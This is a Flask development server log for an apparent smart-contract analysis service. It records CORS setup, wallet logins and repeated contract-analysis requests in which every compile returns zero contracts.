2025-06-22 20:28:40,373 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:28:40,375 - werkzeug - INFO - 192.168.112.1 - - [22/Jun/2025 20:28:40] "POST /feedback HTTP/1.1" 200 -
2025-06-22 20:53:23,449 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-22 20:53:23,620 - app.app - INFO - Application started
2025-06-22 20:53:23,646 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.144.5:8000
2025-06-22 20:53:23,653 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-22 20:53:35,340 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:53:35,348 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:53:35,355 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:53:35,359 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-22 20:53:35,365 - werkzeug - INFO - 192.168.144.1 - - [22/Jun/2025 20:53:35] "OPTIONS /login HTTP/1.1" 200 -
2025-06-22 20:53:35,384 - app.api.auth - INFO - Received login request with method: POST
2025-06-22 20:53:35,386 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-22 20:53:35,387 - app.api.auth - INFO - Request content type: application/json
2025-06-22 20:53:35,388 - app.api.auth - INFO - Processing JSON request
2025-06-22 20:53:35,390 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 20:53:35,838 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 20:53:35,841 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:53:35,843 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:53:35,845 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:53:35,847 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:53:35,849 - werkzeug - INFO - 192.168.144.1 - - [22/Jun/2025 20:53:35] "POST /login HTTP/1.1" 200 -
2025-06-22 20:53:41,645 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:53:41,649 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:53:41,651 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:53:41,654 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-22 20:53:41,659 - werkzeug - INFO - 192.168.144.1 - - [22/Jun/2025 20:53:41] "OPTIONS /history HTTP/1.1" 200 -
2025-06-22 20:53:41,721 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:53:41,722 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:53:41,723 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:53:41,725 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:53:41,726 - werkzeug - INFO - 192.168.144.1 - - [22/Jun/2025 20:53:41] "GET /history HTTP/1.1" 200 -
2025-06-22 20:53:51,847 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:53:51,854 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:53:51,858 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:53:51,861 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:53:51,864 - werkzeug - INFO - 192.168.144.1 - - [22/Jun/2025 20:53:51] "GET /history HTTP/1.1" 200 -
2025-06-22 20:54:12,449 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:54:12,453 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:54:12,454 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:54:12,456 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-22 20:54:12,459 - werkzeug - INFO - 192.168.144.1 - - [22/Jun/2025 20:54:12] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-22 20:54:12,481 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 20:54:12,494 - app.api.contract - INFO - Analyzing code snippet
2025-06-22 20:54:12,500 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-22 20:54:12,506 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp2g6lenrr.sol
2025-06-22 20:54:12,514 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-22 20:54:12,515 - app.services.contract_service - INFO - Compiling contract...
2025-06-22 20:54:12,525 - app.services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-06-22 20:54:12,527 - app.services.contract_service - WARNING - No contracts compiled
2025-06-22 20:54:12,528 - app.services.contract_service - INFO - Temporary file /tmp/tmp2g6lenrr.sol removed
2025-06-22 20:54:12,555 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-22_20-54, status: ERROR
2025-06-22 20:54:12,556 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-22 20:54:12,558 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:54:12,559 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:54:12,560 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:54:12,562 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:54:12,563 - werkzeug - INFO - 192.168.144.1 - - [22/Jun/2025 20:54:12] "POST /analyze HTTP/1.1" 200 -
2025-06-22 20:54:12,588 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:54:12,591 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:54:12,593 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:54:12,594 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:54:12,596 - werkzeug - INFO - 192.168.144.1 - - [22/Jun/2025 20:54:12] "GET /history HTTP/1.1" 200 -
2025-06-22 20:54:53,427 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 20:54:53,445 - app.api.contract - INFO - Analyzing code snippet
2025-06-22 20:54:53,464 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-22 20:54:53,471 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp1abak1vr.sol
2025-06-22 20:54:53,478 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-22 20:54:53,480 - app.services.contract_service - INFO - Compiling contract...
2025-06-22 20:54:53,488 - app.services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-06-22 20:54:53,490 - app.services.contract_service - WARNING - No contracts compiled
2025-06-22 20:54:53,491 - app.services.contract_service - INFO - Temporary file /tmp/tmp1abak1vr.sol removed
2025-06-22 20:54:53,504 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-22_20-54, status: ERROR
2025-06-22 20:54:53,506 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-22 20:54:53,508 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:54:53,509 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:54:53,510 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:54:53,512 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:54:53,514 - werkzeug - INFO - 192.168.144.1 - - [22/Jun/2025 20:54:53] "POST /analyze HTTP/1.1" 200 -
2025-06-22 20:54:53,546 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:54:53,548 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:54:53,549 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:54:53,551 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:54:53,552 - werkzeug - INFO - 192.168.144.1 - - [22/Jun/2025 20:54:53] "GET /history HTTP/1.1" 200 -
2025-06-22 21:10:18,068 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-22 21:10:18,376 - app.app - INFO - Application started
2025-06-22 21:10:18,391 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.176.5:8000
2025-06-22 21:10:18,393 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-22 21:10:28,085 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 21:10:28,099 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 21:10:28,109 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 21:10:28,113 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-22 21:10:28,119 - werkzeug - INFO - 192.168.176.1 - - [22/Jun/2025 21:10:28] "OPTIONS /login HTTP/1.1" 200 -
2025-06-22 21:10:28,134 - app.api.auth - INFO - Received login request with method: POST
2025-06-22 21:10:28,136 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-22 21:10:28,138 - app.api.auth - INFO - Request content type: application/json
2025-06-22 21:10:28,140 - app.api.auth - INFO - Processing JSON request
2025-06-22 21:10:28,142 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 21:10:28,608 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 21:10:28,612 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 21:10:28,613 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 21:10:28,615 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 21:10:28,616 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 21:10:28,618 - werkzeug - INFO - 192.168.176.1 - - [22/Jun/2025 21:10:28] "POST /login HTTP/1.1" 200 -
2025-06-22 21:10:31,930 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 21:10:31,935 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 21:10:31,941 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 21:10:31,944 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-22 21:10:31,946 - werkzeug - INFO - 192.168.176.1 - - [22/Jun/2025 21:10:31] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-22 21:10:31,965 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 21:10:31,973 - app.api.contract - INFO - Analyzing code snippet
2025-06-22 21:10:31,979 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-22 21:10:31,985 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpj1ggjma0.sol
2025-06-22 21:10:31,994 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-22 21:10:31,995 - app.services.contract_service - INFO - Compiling contract...
2025-06-22 21:10:32,006 - app.services.contract_service - INFO - Compilation result: 0 contracts compiled
